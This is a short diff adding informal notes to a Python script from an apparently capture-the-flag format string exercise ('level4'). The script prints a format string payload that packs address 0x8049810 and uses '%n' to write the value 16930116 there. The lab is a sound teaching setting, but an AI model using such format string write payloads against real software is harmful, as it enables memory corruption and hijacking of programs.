@@ -1,4 +1,10 @@
+* nothing realy new in this level4 , i used the same technique as in level3.
+* the following is the script i used to write the value 16930116 at address 0x8049810.
+
+
 import struct
 
 target_address = struct.pack ("I", 0x8049810)
 print target_address + "%16930112p" + "%12$n"
+
+* In this level4 
